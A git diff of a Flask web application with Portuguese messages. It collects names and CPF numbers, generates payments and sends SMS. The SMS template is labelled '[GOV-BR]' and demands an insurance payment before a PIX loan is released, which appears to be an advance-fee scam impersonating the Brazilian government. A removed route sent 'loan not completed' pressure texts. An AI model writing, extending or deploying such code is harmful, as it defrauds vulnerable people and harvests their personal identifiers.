@@ -8,13 +8,10 @@ import base64
 from io import BytesIO
 import re
 import random
-from urllib.parse import quote
 import string
 import requests
-from urllib.parse import urlencode
 import json
 import http.client
-import unicodedata
 from payment_gateway import get_payment_gateway
 
 app = Flask(__name__)
@@ -218,13 +215,10 @@ def send_sms_smsdev(phone_number: str, message: str) -> bool:
     Send SMS using SMSDEV API
     """
     try:
-        # Log para sempre registrar tentativa de envio
-        app.logger.info(f"[SMSDEV] Tentativa de envio para {phone_number}: {message}")
-        
         # Get SMS API key from environment variables
         sms_api_key = os.environ.get('SMSDEV_API_KEY')
         if not sms_api_key:
-            app.logger.error("[SMSDEV] SMSDEV_API_KEY não encontrada nas variáveis de ambiente")
+            app.logger.error("SMSDEV_API_KEY not found in environment variables")
             return False
 
         # Format phone number (remove any non-digits and ensure it's in the correct format)
@@ -240,13 +234,14 @@ def send_sms_smsdev(phone_number: str, message: str) -> bool:
 
             # Make API request
             response = requests.get('https://api.smsdev.com.br/v1/send', params=params)
-            app.logger.info(f"[SMSDEV] SMS enviado para {formatted_phone}. Resposta: {response.text}")
+
+            app.logger.info(f"SMSDEV: SMS sent to {formatted_phone}. Response: {response.text}")
             return response.status_code == 200
         else:
-            app.logger.error(f"[SMSDEV] Formato de telefone inválido: {phone_number}")
+            app.logger.error(f"Invalid phone number format: {phone_number}")
             return False
     except Exception as e:
-        app.logger.error(f"[SMSDEV] Erro ao enviar SMS: {str(e)}")
+        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
         return False
 
 def send_sms_owen(phone_number: str, message: str) -> bool:
@@ -327,7 +322,7 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
         # Message template
         message = f"[GOV-BR] {first_name}, estamos aguardando o pagamento do seguro no valor R${amount:.2f} para realizar a transferencia PIX do emprestimo para a sua conta bancaria."
 
-        # Escolher qual API usar com base na configuração global, para mensagens de pagamento gerado
+        # Choose which API to use based on SMS_API_CHOICE
         if SMS_API_CHOICE.upper() == 'OWEN':
             return send_sms_owen(phone_number, message)
         else:  # Default to SMSDEV
@@ -490,32 +485,11 @@ def payment_update():
         # Obter dados do usuário da query string
         nome = request.args.get('nome')
         cpf = request.args.get('cpf')
-        phone = request.args.get('phone')  # Tenta obter o telefone, se disponível
 
         if not nome or not cpf:
             app.logger.error("[PROD] Nome ou CPF não fornecidos")
             return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400
-            
-        # Verificar se estamos em um ambiente replit
-        # Se o domínio contiver ".replit", redirecionamos direto para a página de obrigado
-        if ".replit" in request.host:
-            app.logger.info("[PROD] Domínio .replit detectado, redirecionando para página de obrigado")
-            
-            # Se tivermos um número de telefone, enviar SMS de confirmação
-            if phone:
-                try:
-                    amount = 74.90  # Valor fixo para atualização cadastral
-                    success = send_sms(phone, nome, amount)
-                    if success:
-                        app.logger.info(f"[PROD] SMS enviado com sucesso para {phone}")
-                    else:
-                        app.logger.error(f"[PROD] Falha ao enviar SMS para {phone}")
-                except Exception as e:
-                    app.logger.error(f"[PROD] Erro ao enviar SMS: {str(e)}")
-            
-            # Redirecionar para a página de obrigado com os mesmos parâmetros
-            return redirect(url_for('thank_you', nome=nome, cpf=cpf, phone=phone))
-            
+
         app.logger.info(f"[PROD] Dados do cliente para atualização: nome={nome}, cpf={cpf}")
 
         # Inicializa a API usando nossa factory
@@ -588,64 +562,6 @@ def check_payment_status(transaction_id):
     except Exception as e:
         app.logger.error(f"[PROD] Erro ao verificar status: {str(e)}")
         return jsonify({'error': str(e)}), 500
-        
-@app.route('/send-payment-confirmation-sms')
-@check_referer
-def send_payment_confirmation_sms():
-    try:
-        # Get parameters from request
-        phone = request.args.get('phone')
-        nome = request.args.get('nome')
-        amount = request.args.get('amount')
-        dominio = request.url_root.rstrip('/')
-        
-        app.logger.info(f"[SMS-CONFIRM] Recebida solicitação de SMS com: phone={phone}, nome={nome}, amount={amount}")
-        
-        # Validate parameters
-        if not phone or not nome or not amount:
-            app.logger.error("[SMS-CONFIRM] Parâmetros faltando para envio de SMS")
-            return jsonify({'success': False, 'error': 'Parâmetros faltando'}), 400
-        url_params = request.args.copy()
-
-        # Format URL parameters for the thank you page
-        encoded_params = []
-        for k, v in url_params.items():
-            # Codifica cada chave e valor individualmente
-            encoded_k = quote(k)
-            encoded_v = quote(v)
-            encoded_params.append(f"{encoded_k}={encoded_v}")
-    
-        # Junta todos os parâmetros com '&' e monta a URL final
-        url_params_str = "&".join(encoded_params)
-        # Extract and format first name
-        primeiro_nome = ''
-        if nome:
-            # Get only the first name
-            primeiro_nome = nome.split()[0] if nome.split() else nome
-            # Convert to lowercase, then capitalize
-            primeiro_nome = primeiro_nome.lower().capitalize()
-            # Remove accents
-            primeiro_nome = ''.join(c for c in unicodedata.normalize('NFD', primeiro_nome)
-                               if unicodedata.category(c) != 'Mn')
-                
-        message = f"IMPORTANTE: {primeiro_nome}, EMPRESTIMO NAO CONCLUIDO! Para concluir o deposito em sua conta resolva as pendencias: {dominio}/obrigado?{url_params_str}";
-        app.logger.info(f"[SMS-CONFIRM] Enviando SMS de confirmação para {phone}: {message}")
-        
-        # Sempre usar SMSDEV API para confirmações de pagamento
-        success = send_sms_smsdev(phone, message)
-        
-        app.logger.info(f"[SMS-CONFIRM] Resultado do envio: {success}")
-        
-        if success:
-            app.logger.info(f"[SMS-CONFIRM] SMS enviado com sucesso para {phone}")
-            return jsonify({'success': True})
-        else:
-            app.logger.error(f"[SMS-CONFIRM] Falha ao enviar SMS para {phone}")
-            return jsonify({'success': False, 'error': 'Falha ao enviar SMS'}), 500
-            
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao enviar SMS de confirmação: {str(e)}")
-        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/verificar-cpf')
 @check_referer
@@ -743,6 +659,7 @@ def seguro_prestamista():
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 @app.route('/obrigado')
+@check_referer
 def thank_you():
     try:
         # Get customer data from query parameters if available
@@ -750,7 +667,7 @@ def thank_you():
             'name': request.args.get('nome', ''),
             'cpf': request.args.get('cpf', '')
         }
-        
+
         meta_pixel_id = os.environ.get('META_PIXEL_ID')
         return render_template('thank_you.html', customer=customer, meta_pixel_id=meta_pixel_id)
     except Exception as e:
